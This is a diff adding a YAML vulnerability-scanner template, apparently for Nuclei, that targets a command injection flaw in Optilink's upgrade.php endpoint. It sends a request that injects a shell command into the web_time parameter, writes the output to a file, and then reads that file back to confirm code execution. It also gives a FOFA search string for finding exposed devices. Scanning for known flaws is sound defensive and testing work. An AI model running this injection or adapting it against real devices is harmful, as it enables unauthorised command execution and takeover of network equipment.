@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - Link encap:Ethernet
+            - eth1
+            - collisions:0 txqueuelen:1000
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /cgi/fsystem/upgrade.php?time=1&web_time=;ifconfig>{{username}}.txt; HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+        - |
+          GET /cgi/fsystem/{{username}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+id: Optilink-upgrade_php-RCE
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/html/css/dxtdata.css"
+        Optilink upgrade.php 接口存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+    name: Optilink upgrade.php 远程命令执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/4oXPBN2P3iHbF4t_zgbsEw
+    severity: high
+    tags:
+        - RCE
+variables:
+    username: '{{to_lower(rand_base(6))}}'
